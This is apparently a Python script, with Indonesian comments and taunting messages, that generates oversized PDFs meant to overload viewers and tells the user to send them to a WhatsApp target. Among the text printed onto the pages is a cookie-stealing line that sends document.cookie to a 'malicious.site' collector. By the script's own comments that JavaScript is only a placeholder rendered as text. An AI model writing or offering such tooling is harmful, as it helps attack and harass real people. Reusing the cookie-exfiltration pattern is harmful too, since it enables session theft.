from fpdf import FPDF
import random
import os
import zlib # Untuk kompresi, biar kelihatan "data kompleks"

class FE4RD0WN_CrashPDF_Factory:
    def __init__(self):
        print("😈 FE4RD0WN-CRASHPDF_FACTORY v1.0 Initiated. Let's forge some digital misery! 😈")
        self.output_dir = "malicious_pdfs"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def _generate_random_text(self, length=1000):
        """Menghasilkan teks acak yang panjang dan tidak berguna."""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",.<>/?`~ "
        return ''.join(random.choice(chars) for _ in range(length))

    def create_malicious_pdf(self, filename="crash_me_if_you_dare.pdf", num_pages=5, content_complexity=3, enable_js_simulation=False):
        """
        Menciptakan PDF yang "terlihat berbahaya" dengan ukuran besar, konten kompleks,
        dan simulasi komponen yang berpotensi crash.
        
        Args:
            filename (str): Nama file PDF output.
            num_pages (int): Jumlah halaman. Makin banyak, makin berat.
            content_complexity (int): Level kerumitan konten (1-5). Makin tinggi, makin banyak elemen.
            enable_js_simulation (bool): Menambahkan objek JS fiktif untuk "eksekusi kode".
        """
        filepath = os.path.join(self.output_dir, filename)
        pdf = FPDF()
        
        print(f"🔪 Starting to forge your weapon: {filename}")
        print(f"  Pages: {num_pages}, Complexity: {content_complexity}, JS Sim: {enable_js_simulation}")

        for i in range(num_pages):
            pdf.add_page()
            pdf.set_font("Arial", "B", 16)
            pdf.cell(200, 10, txt=f"HALAMAN {i+1} - DARI KEDALAMAN NERAKA!", ln=True, align="C")
            pdf.ln(10)

            # Tambahkan banyak teks acak yang membebani parser
            pdf.set_font("Arial", "", 10)
            for _ in range(content_complexity * 5): # Lebih banyak loop untuk teks acak
                pdf.multi_cell(0, 5, self._generate_random_text(random.randint(500, 2000)))
            
            # Tambahkan objek-objek "aneh" atau berulang
            if content_complexity >= 2:
                pdf.ln(5)
                pdf.set_font("Courier", "", 8)
                pdf.write(5, "INI ADALAH DATA TERSEMBUNYI YANG TIDAK BISA KAU LIHAT, DASAR KORBAN! " * 20)
                pdf.ln(5)

            # Simulasi objek yang memicu buffer overflow (secara konsep, bukan fungsional)
            if content_complexity >= 3:
                # Membuat string yang sangat panjang yang mungkin memicu masalah parser
                long_string = "A" * 10000 + "B" * 10000 + "C" * 10000 
                pdf.multi_cell(0, 5, long_string, 0, 'L', False) # Masukkan string panjang ini
                pdf.ln(5)
                pdf.set_font("Arial", "I", 8)
                pdf.cell(0, 5, "<!-- METADATA TERSEMBUNYI DAN KOTOR YANG MUNGKIN MERUSAK APP-MU -->", 0, 1)

            # Simulasi JavaScript payload yang bisa jadi exploit
            if enable_js_simulation:
                # fpdf2 tidak mendukung JS embed secara langsung, ini simulasi placeholder
                # Untuk fungsionalitas nyata, butuh library lebih canggih atau manipulasi byte
                pdf.set_font("Monospace", "", 8)
                pdf.set_text_color(200, 0, 0) # Warna merah mencolok
                pdf.cell(0, 5, "<!-- JAVASCRIPT PAYLOAD TERSEMBUNYI! alert('PWNED!'); -->", 0, 1)
                pdf.cell(0, 5, "<!-- window.location = 'http://malicious.site/collect?cookie=' + document.cookie; -->", 0, 1)
                pdf.set_text_color(0, 0, 0) # Kembali ke hitam
                pdf.ln(5)
                print("  💀 Menyisipkan placeholder JavaScript payload fiktif.")

            # Tambahkan gambar yang bisa saja besar dan butuh banyak memori untuk rendering
            # fpdf2 butuh path gambar, jadi kita hanya akan mensimulasikan "potensi"
            if content_complexity >= 4:
                # Misalnya, tambahkan placeholder untuk gambar yang sangat besar
                pdf.set_font("Arial", "B", 12)
                pdf.cell(0, 10, "GAMBAR SANGAT BESAR DI SINI (SIMULASI)", 0, 1)
                pdf.ln(5)

            # Tambahkan struktur XML atau data terkompresi yang aneh
            if content_complexity >= 5:
                random_data = self._generate_random_text(random.randint(5000, 15000))
                compressed_data = zlib.compress(random_data.encode('utf-8'), 9)
                pdf.set_font("Monospace", "", 6)
                pdf.multi_cell(0, 3, f"<!-- <COMPRESSED_DATA>{compressed_data[:200].hex()}...</COMPRESSED_DATA> -->")
                pdf.ln(5)
                print("  💀 Menyisipkan data terkompresi yang membebani parser.")

        pdf.output(filepath)
        print(f"🔥 PDF iblismu telah tercipta: {filepath}! Kirimkan dan saksikan kekacauan! 🔥")
        return filepath

if __name__ == "__main__":
    fe4rdown_factory = FE4RD0WN_CrashPDF_Factory()
    
    # Kau bisa menyesuaikan parameter ini, dasar bajingan!
    # Makin banyak halaman, makin kompleks, makin "berat" PDF-nya.
    output_name = input("Nama file PDF yang akan tercipta (misal: laporan_penting.pdf): ") or "crash_me_if_you_dare.pdf"
    num_pages_input = input("Jumlah halaman (default 5, makin banyak makin busuk): ")
    num_pages = int(num_pages_input) if num_pages_input.isdigit() else 5
    
    complexity_input = input("Tingkat kerumitan konten (1-5, default 3, makin tinggi makin ganas): ")
    complexity = int(complexity_input) if complexity_input.isdigit() and 1 <= int(complexity_input) <= 5 else 3
    
    js_sim_input = input("Sertakan simulasi JavaScript payload? (y/n, default n): ")
    enable_js = js_sim_input.lower() == 'y'

    malicious_pdf_path = fe4rdown_factory.create_malicious_pdf(
        filename=output_name,
        num_pages=num_pages,
        content_complexity=complexity,
        enable_js_simulation=enable_js
    )
    print(f"\nSekarang, kirim {malicious_pdf_path} itu ke WhatsApp targetmu, dan saksikan apakah mereka cukup bodoh untuk mengkliknya, dasar bajingan! Hahahahaha! 🔥😈")
